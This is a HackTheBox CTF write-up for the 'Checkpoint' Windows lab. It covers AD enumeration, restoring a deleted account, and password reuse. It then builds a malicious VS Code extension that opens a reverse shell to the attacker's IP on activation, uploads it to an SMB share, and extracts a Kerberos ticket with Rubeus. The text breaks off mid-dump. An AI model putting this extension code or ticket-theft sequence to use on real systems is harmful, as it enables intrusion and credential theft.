# Checkpoint
Checkpoint is a medium Windows box in HackTheBox. It contains misconfiguration of user permissions that allow for deleted accounts to be restored leading to malware upload and eventually complete system and domain compromise. 

## Reconnaissance
We start with scanning the machine's ports to find out what services might be running on it. Once we have the ports, we can run a more aggressive scan to get the services and their versions.
(Note: I reset the machine halfway through this write-up so the IP address will change)

```
nmap -T4 -p- 10.129.59.232 

Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49686/tcp open  unknown
49712/tcp open  unknown
49721/tcp open  unknown

Deeper Nmap Scan

nmap -T4 -p53,88,135,139,389,445,464,593,646,3268,3269,5985,9389,49664,49670,49671,49679,49680,49686,49712,49721 -A -sC -sV 10.129.59.232


PORT      STATE    SERVICE           VERSION 
53/tcp    open     domain            Simple DNS Plus
88/tcp    open     kerberos-sec      Microsoft Windows Kerberos (server time: 2026-09-23 23:02:08Z)
135/tcp   open     msrpc             Microsoft Windows RPC
139/tcp   open     netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open     ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http        Microsoft Windows RPC over HTTP 1.0
646/tcp   filtered ldp
3268/tcp  open     ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
3269/tcp  open     globalcatLDAPssl?
5985/tcp  open     http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open     mc-nmf            .NET Message Framing
49664/tcp open     msrpc             Microsoft Windows RPC
49670/tcp open     msrpc             Microsoft Windows RPC
49671/tcp open     msrpc             Microsoft Windows RPC
49679/tcp open     msrpc             Microsoft Windows RPC
49680/tcp open     ncacn_http        Microsoft Windows RPC over HTTP 1.0
49686/tcp open     msrpc             Microsoft Windows RPC
49712/tcp open     msrpc             Microsoft Windows RPC
49721/tcp open     msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see here that kerberos, LDAP, SMB, and winrm are active and open. We have also been provided with credentials for this pentest.

We also find the domain name: checkpoint.htb.

user:alex.turner
password: Checkpoint2024!

First we check and see what kind of information we can pull from the LDAP system. For this, we can use netexec.

```
─(.venv)─(kali㉿kali)-[~/Hacks/checkpoint]
└─$ nxc ldap 10.129.64.229 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users 
LDAP        10.129.64.229   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.129.64.229   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
LDAP        10.129.64.229   389    DC01             [*] Enumerated 18 domain users: checkpoint.htb
LDAP        10.129.64.229   389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                  
LDAP        10.129.64.229   389    DC01             Administrator                 2026-05-09 12:16:34 0        Built-in account for administering the computer/domain
LDAP        10.129.64.229   389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.129.64.229   389    DC01             krbtgt                        2026-05-09 04:41:01 0        Key Distribution Center Service Account        
LDAP        10.129.64.229   389    DC01             alex.turner                   2026-05-09 05:00:08 0                                                       
LDAP        10.129.64.229   389    DC01             mark.davies                   2026-05-09 05:00:48 0                                                       
LDAP        10.129.64.229   389    DC01             ryan.brooks                   2026-05-10 09:46:18 9                                                       
LDAP        10.129.64.229   389    DC01             svc_deploy                    2026-05-09 05:01:19 0        Deployment service account                     
LDAP        10.129.64.229   389    DC01             james.harper                  2026-05-09 05:02:53 0                                                       
LDAP        10.129.64.229   389    DC01             sarah.mitchell                2026-05-09 05:02:58 0                                                       
LDAP        10.129.64.229   389    DC01             emily.carter                  2026-05-09 05:03:05 0                                                       
LDAP        10.129.64.229   389    DC01             david.reynolds                2026-05-09 05:03:11 0                                                       
LDAP        10.129.64.229   389    DC01             jessica.coleman               2026-05-09 05:03:15 0                                                       
LDAP        10.129.64.229   389    DC01             lauren.flores                 2026-05-09 05:03:21 0                                                       
LDAP        10.129.64.229   389    DC01             michael.torres                2026-05-09 05:03:28 0                                                       
LDAP        10.129.64.229   389    DC01             kevin.patterson               2026-05-09 05:03:33 0                                                       
LDAP        10.129.64.229   389    DC01             brian.jenkins                 2026-05-09 05:03:37 0                                                       
LDAP        10.129.64.229   389    DC01             megan.perry                   2026-05-09 05:03:42 0                                                       
LDAP        10.129.64.229   389    DC01             max.palmer                    2026-05-25 21:25:15 0     
```

We find a list of user names. Attempting to bruteforce the accounts using hydra proves to be a dead-end so we need to find another way in. Fortunately, we can use bloodyAD to see if our user has any permissions on any of these. But first, let's look and see if there are any shares in the SMB we can access.

```
└─$ nxc smb checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --shares
SMB         10.129.65.17    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.65.17    445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
SMB         10.129.65.17    445    DC01             [*] Enumerated shares
SMB         10.129.65.17    445    DC01             Share           Permissions     Remark
SMB         10.129.65.17    445    DC01             -----           -----------     ------
SMB         10.129.65.17    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.65.17    445    DC01             C$                              Default share
SMB         10.129.65.17    445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.65.17    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.65.17    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.65.17    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.65.17    445    DC01             VMBackups                       

```
We have read access to a DevDrop server. We connect to it using SMBclient and find that it is empty. The description is very interesting. Let's make a note of that.

Since we were unable to find any easy credentials through brute force, let's see what write permissions Alex has on this machine.

```
└─$ bloodyad -H  checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb get writable

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD


```

## Foothold

There's something very interesting here. We have DACL write permissions over the "Deleted Objects" group, and within that group we also have permission to write to a deleted "Mark Davies" account. Let's see if we can bring it back to life.

```
─$ bloodyad -H  checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb set restore mark.davies
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb

```

It lives! We attempt another password brute-force attack on Mark but that also doesn't work. We also decide to check the password for the Alex Turner account to see if we get lucky and there's password reuse here. 

```
└─$ bloodyad -H  checkpoint.htb -u mark.davies -p 'Checkpoint2024!' -d checkpoint.htb get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

```

We find here a great example of why password reuse is a terrible idea. Let's go back to netexec and see if this user's share permissions are different from Alex's.

```
└─$ nxc smb checkpoint.htb -d checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares
SMB         10.129.65.17    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.65.17    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
SMB         10.129.65.17    445    DC01             [*] Enumerated shares
SMB         10.129.65.17    445    DC01             Share           Permissions     Remark
SMB         10.129.65.17    445    DC01             -----           -----------     ------
SMB         10.129.65.17    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.65.17    445    DC01             C$                              Default share
SMB         10.129.65.17    445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.65.17    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.65.17    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.65.17    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.65.17    445    DC01             VMBackups                       

```

Would you look at that? Mark has write access to DevDrop. According to the description here, the share is meant for submission of approved .vsix packages compatible with VS Code engine 1.118. 

We do a little research into .vsix packages and learn that VS Code uses these for extensions. It would be terrible if somebody submitted something to be executed on there. A little research into .vsix malware development reveals to us that we can execute malicious code on the host by creating our own VS Code extension and submitting it into the share. This is because VS Code's API endpoint 'vscode.commands.executeCommand' allow for code execution by the extension. 

Since they went to the trouble of making this possible for us, it would be rude not to take advantage of it. 

First we learn how to create .vsix packages.

[We can learn how to do so here](https://www.syncfusion.com/blogs/post/creating-extensions-for-visual-studio-code-a-complete-guide)

We start installing the code generator to help us in creating this package and running it

```
npm install -g yo generator-code
yo code
```

This runs the vsix package creation wizard. We will choose "Make a Web Project" "Unbundled and "npm" and let it do its thing. Name your extension whatever you want. I named mine "shellysweets" for this lab. 

Once its done it'll create a directory with all of the files we'll need. First we need to create the extension.ts file. We find a POC for this attack [here] (https://control-plane.io/posts/abusing-vscode-from-malicious-extensions-to-stolen-credentials-part-1/). 

```
import * as vscode from 'vscode';

export function activate(context: vscode.ExtensionContext) {

  const disposable = vscode.commands.registerCommand('rs', () => {

    const client = clientConnection();
    console.log('client', client);
  });

  context.subscriptions.push(disposable);
}

// This method is called when your extension is deactivated
export function deactivate() {}

async function clientConnection() {
  var net = require('net'),
      cp = require('child_process'),
    sh = cp.spawn('/bin/sh', []);
  var client = new net.Socket();
  client.connect(8080, 'localhost', function() {
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
  });
  client.on('close', function() {
      sh.kill();
  });
}
```

This code is nice, but we are going to need to make some edits if it's going to work for our purposes. First, we need to change the shell from /bin/sh to cmd since we're attacking a windows machine. 

Next, we want to move the malicious code inside the clientConnection function to the activate function. 

This is because our code will not run unless VS Code registers "rs" as a command, and we don't really want to wait for something so specific to occur. Instead let's just make it run from the get go. Our final code ends up looking like this (use your own IP and port):

```
import * as vscode from 'vscode';

export function activate(context: vscode.ExtensionContext) {

    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("cmd", ["/k"]);
    var client = new net.Socket();
    client.connect(1313, "10.10.14.108", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
}

// This method is called when your extension is deactivated
export function deactivate() {}

```

The reason we add "/k" to the cmd's arguments is that /k will keep the connection alive instead of closing it immediately as a result of no arguments being provided with the cmd executable. 
We save the extension.ts file in the src directory in the .vsix development directory. 

We also need to tell VS Code when to run the activation function and make sure the packaging is compatible with version 1.118.0. For this, we also edit package.json:

```
{
  "name": "shellysweets",
  "displayName": "shellysweets",
  "description": "A shell of a time",
  "version": "0.0.1",
  "engines": {
    "vscode": "^1.118.0"
  },
  "categories": [
    "Other"
  ],
  "activationEvents": ["*"],
  "main": "./out/extension.js",
  "contributes": {
    "commands": [
      {
        "command": "shellysweets.helloWorld",
        "title": "Hello World"
      }
    ]
  },
  "scripts": {
    "vscode:prepublish": "npm run compile",
    "compile": "tsc -p ./",
    "watch": "tsc -watch -p ./",
    "pretest": "npm run compile && npm run lint",
    "lint": "eslint src",
    "test": "vscode-test"
  },
  "devDependencies": {
    "@types/mocha": "^10.0.10",
    "@types/node": "24.x",
    "@types/vscode": "^1.118.0",
    "@vscode/test-cli": "^0.0.15",
    "@vscode/test-electron": "^3.0.0",
    "esbuild": "^0.28.2",
    "eslint": "^10.5.0",
    "typescript": "^6.0.3",
    "typescript-eslint": "^8.61.1"
  },
  "overrides": {
    "diff": "^8.0.4",
    "serialize-javascript": "^7.0.6"
  }
}

```

We change vscode in engine and in devDependencies to 1.118.0 and add a "*" to the activationEvents list. Now our malware is ready to go. But first we need to package it.

```
cd shellysweets
vsce package
```

Say yes to each of the prompts that come up and now we have our beautiful .vsix RCE malware ready to submit. Start a listener on the port you chose on another terminal or pane. 

```
nc -nlvp 1313
```

Now we're going to upload the .vsix package to the DevDrop share using the resurrected Mark account

```
smbclient \\\\checkpoint.htb\DevDrop -U checkpoint/mark.davies%'Checkpoint2024!'
Try "help" to get a list of possible commands.
smb: \> put shellysweets-0.0.1.vsix 
putting file shellysweets-0.0.1.vsix as \shellysweets-0.0.1.vsix (40.0 kB/s) (average 40.0 kB/s)
smb: \> 

```
Now we wait. After about a minute or so we see that we have shell on user ryan.brooks' account. We can go ahead and get the user flag from his desktop.

## Rooting

It'd be great to have persistence so we don't have to resubmit the .vsix package. Lucky for us, we have access to SMB on the mark davies account and can submit Rubeus to see if we can extract the user's ccache ticket for Kerberos authentication. 

On your machine:

```
└─$ smbclient \\\\checkpoint.htb\\DevDrop -U checkpoint/mark.davies%'Checkpoin│
t2024!'                                                                       │
Try "help" to get a list of possible commands.                                │
smb: \> put Rubeus.exe                                                        │
putting file Rubeus.exe as \Rubeus.exe (1175.3 kB/s) (average 1175.3 kB/s)    │
smb: \>    
```

In the Ryan shell:

```
C:\Shares\DevDrop>cd /Shares/DevDrop
cd /Shares/DevDrop

C:\Shares\DevDrop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2660-795C

 Directory of C:\Shares\DevDrop

10/03/2026  01:53 PM    <DIR>          .
05/09/2026  07:42 AM    <DIR>          ..
10/03/2026  01:53 PM           278,016 Rubeus.exe
10/03/2026  01:51 PM             3,969 shellysweets-0.0.1.vsix
               2 File(s)        281,985 bytes
               2 Dir(s)  10,195,226,624 bytes free

C:\Shares\DevDrop>Rubeus dump
Rubeus dump

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


Action: Dump Kerberos Ticket Data (Current User)

[*] Current LUID    : 0x693e6


C:\Shares\DevDrop>Rubeus tgtdeleg /nowrap
Rubeus tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: NlE9S/Dvk0htc03p2q3mJburHw/Hdx1fjqY6/yNIFrg=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRurc3wDydUMd4kFR+jVemBis9T9rL688nz0TFp2Dd0mJ/3b4dG8aGV9Oh8TwLv5ObcaVswgtdrILePAaJVQaDdH9cAXxP3/04yeKe/TlAwhxYHO8PMv2HbwDysHEM+MhykgwcwPwQqOSs+TWbkZoeQSI4ZObeSBaYb5uZwHyIA3XfwaL/U3YH35msAojBkEkCLJX+hdbqZzL9hsUJM2wO8CeYMOWKFc4BxQ39gQ9kMe0OvR87BjnCWJfzvo/JzXJr+PLg7TXxVNq8HLVxciHVhLax3nso/4iSov8pIj0LhVuM2/4yMjxfDYl4YzpoYGMpnRvH1M/UJjz6DqXuzO4i5GMJru03KuqFkftyLg2Upwe0BoAOSKsxQD11qjE7yx1x64kSGmbd3uj6Dz4f7QI7gSrFCoXtuI0WpzeERzK/zJBIcr8diTinmu7VL09XJxOrGDMx2Y28u5TjpTxT3JyOHKySxvbGD2nfFHvsBuNdaZKTZ57aCFnzo0h9cWu4YJUC2nf3jFwEyaeRQIYMw6mIRV6b/SlcL+O4VE1RU0hJ/zq+BNY4ZWNbA5ZIEha8feT/RfIxXH7cVn8rxoazqgoifgXs8oRUhve4s2jbdV+AYBKMiqYSFPrDY68SxWVGHh0I2mwVBwJaKoDRWJlkluJVF0WQBViLRmJQw0vLgdvhFPQ4q2TPjwrGKFV+hRpl2UdIL+yR9CZgr5rEwcAaJq8WseDGe50spOC/6+UR5MviHBTH8PPtwAKTOb1v6aSgSDr2FNPM/P2W0N9mec1sPTbWpYUi2CQqckaALnrN2VV9LXa4GP/cssfTZmrbfQ0OL+Syj98gYQhbM6JpdtLUNaRCvar915wMgjD9i0MhFBVMIV86S6IwxVsJw3STvlBhS3Y3B23z/JLrIZl3MnR182kAHXEeozsTQVa/r5s3mDLrNlv4PEHoCMvYMLbXFa391m7AOgryRPuvAua32Z8VHlTHtd24xqwIgtRBoeMF7sv3gIMtVBPOetI5q0Ncs+eL3Qb8tzW2Bq2G/9xsjpgCQewtr/SBl7sj6aaLYUbeC8A+PgLKLmthCOYaQ2T7GCjHxDuw6Crs9Vr5kOJDwK/1P9RAHu/WDh6Znb/WAtUhhjpSwJlahsh3FTm4lIeAwpCYJaWNbeGDf885GRucQ7l01SIIlg3NCn6uv+4Sm7enC16exaJ3OSqMNyOJlWwHo/gUthRJ61Nbk5fzctWnImnNauMPRC2/3lapFMEIpdyd0CKD6xNMDhXHwSOrQokKIbgJmIfYjn1wnA1T2vizdKICe/45mkAtFeEQ6D24EjiCbcd4xYWfW82f41/fhJRuv/wHDM0f68MeMKjHum85G3z/sa5W5HQLgJ7i5BIFFWz20oCHb7onNcoM2WzkC6S1RyFJA5Gz3/FyRSJ6YlNe1TPjDZ2cGO1QAl0tZpifyDLh4KGXeKtNeVLWw7C1fZzFtdyeO8ZflLc+tdnWDWU6HLBeI+HgqLwpQjdQ4gLq8f8yhZ9Q5o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQg0OMocNqqc6lmxa4ZE3ObAP9ZcHxHFjUwJS9b9lgQdJehEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MTAwMzIwNTUxNVqmERgPMjAyNjEwMDQwNjU1MTVapxEYDzIwMjYxMDEwMjA1NTE1WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=

```
First, we dump the credentials into memory, then Rubeus extracts the ticket in base64. All we have to do now is copy and paste it into a file on our system, and decode it using base64.

```
base64 -d ryanbased > ryan.kirbi
```
We need to convert the ticket from kirbi to ccache. Fortunately impacket has us covered:

```
┌──(.venv)─(kali㉿kali)-[~/Hacks/checkpoint]
└─$ ticketConverter.py ryan.kirbi ryan.ccache
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done

```

We then test to see if the ticket is valid using klist

```
└─$ klist ryan.ccache 
Ticket cache: FILE:ryan.ccache
Default principal: ryan.brooks@CHECKPOINT.HTB

Valid starting       Expires              Service principal
10/03/2026 05:50:51  10/03/2026 15:50:51  krbtgt/CHECKPOINT.HTB@CHECKPOINT.HTB
        renew until 10/10/2026 05:50:51

```
Beautiful. We have the kerberos-provisioned ticket for Ryan.Brooks. Let's use that to see what we can do with his account using bloodyAD. We export the ticket into the KRB5CCNAME environment variable and run bloodyAD with kerberos auth. We get an error.

```
─$ export KRB5CCNAME=~/Hacks/checkpoint/ryan.ccache                                                                                                        
                                                                                                                                                            
┌──(.venv)─(kali㉿kali)-[~/Hacks/checkpoint]                                                                                                                
└─$ bloodyad -H checkpoint.htb -d checkpoint.htb -k get writable

...

kerbad.protocol.errors.KerberosError: get_TGS failed! Error Name: KDC_ERR_S_PRINCIPAL_UNKNOWN Detail: "Server not found in Kerberos database" 
    
```
What happened? Essentially, the ticket was granted by krbtgt, but we are using bloodyAD which uses the ldap service. We must get a ticket for that spn. Also, in my case, I began to getting clock skew errors due to a time difference between my machine and the remote host. To remedy this, I began synchronizing the two before each command

```
sudo ntpdate -u checkpoint.htb; getST.py -k -no-pass -dc-ip 10.129.65.17 checkpoint.htb/ryan.brooks -spn ldap/checkpoint.htb
2026-10-03 17:08:09.981675 (-0400) +25199.560589 +/- 0.016129 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.560589
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in ryan.brooks@ldap_checkpoint.htb@CHECKPOINT.HTB.ccache

```

So we don't have to change our kerberos environment variable back and forth between the krbtgt ticket and the ldap ticket, we will simply merge them:

```
$ kutil ryan.ccache -m ryan.brooks@ldap_checkpoint.htb@CHECKPOINT.HTB.ccache
[+] Kerberos ticket cache 'ryan.ccache' loaded.
[+] Kerberos ticket cache 'ryan.brooks@ldap_checkpoint.htb@CHECKPOINT.HTB.ccache' loaded.
[+] Added 1 credential(s) to 'ryan.ccache'
[+] Saving ticket as 'ryan.ccache'

```
Now let's try that bloodyAD command again:

```
sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -d checkpoint.htb -k get writable
2026-10-03 17:09:12.112352 (-0400) +25199.560609 +/- 0.015415 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.560609

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=DMSAHolder,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Ryan Brooks,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
permission: CREATE_CHILD

```

Awesome. We have write access over the svc_deploy account. We also CREATE CHILD privileges over a "DMSAHolder" group. Interesting. We'll look at that later.

```
$ sudo ntpdate -u checkpoint.htb; bloodyad -H checkpoint.htb -d checkpoint.htb -k get object "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
2026-10-03 17:16:30.819956 (-0400) +25199.564511 +/- 0.017378 checkpoint.htb 10.129.65.17 s1 no-leap
CLOCK: time stepped by 25199.564511

distinguishedName: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: svc_deploy
codePage: 0
countryCode: 0
dSCorePropagationData: 2026-05-09 14:41:59+00:00
description: Deployment service account
instanceType: 4
lastLogoff: 1601-01-01 00:00:00+00:00
lastLogon: 1601-01-01 00:00:00+00:00
logonCount: 0
memberOf: CN=BackupAccess,OU=ServiceAccounts,DC=checkpoint,DC=htb; CN=Remote Management Users,CN=Builtin,DC=checkpoint,DC=htb
nTSecurityDescriptor: O:S-1-5-21-3129162710-3498938529-1807524340-512G:S-1-5-21-3129162710-3498938529-1807524340-512D:AI(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-3129162710-3498938529-1807524340-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3129162710-3498938529-1807524340-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-11d1-aebd-0000f80367c1;;S-1-5-32-561)(OA;;0x30;5805bc62-bdc9-4428-a5e2-856a0f4c185e;;S-1-5-32-561)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OA;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a54-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;CR;ab721a56-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;;S-1-5-11)(OA;;RP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-11)(OA;;RP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;RP;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-11)(OA;;0x30;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b2-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(OA;;0x30;e45795b3-9455-11d1-aebd-0000f80367c1;;S-1-5-10)(A;;0xf01ff;;;S-1-5-21-3129162710-3498938529-1807524340-512)(A;CI;0x20028;;;S-1-5-21-3129162710-3498938529-1807524340-1103)(A;;0xf01ff;;;S-1-5-32-548)(A;;RC;;;S-1-5-11)(A;;0x20094;;;S-1-5-10)(A;;0xf01ff;;;S-1-5-18)(OA;CIIOID;RP;4c164200-20c0-11d0-a768-00aa006e0529;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;4c164200-20c0-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;59ba2f42-79a2-11d0-9020-00c04fc2d3cf;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIIOID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-32-554)(OA;CIID;RP;037088f8-0ae1-11d2-b422-00a0c968f939;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-32-554)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-526)(OA;CIID;0x30;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3129162710-3498938529-1807524340-527)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-3-0)(OA;CIIOID;SW;9b026da6-0d3c-465c-8bee-5199d71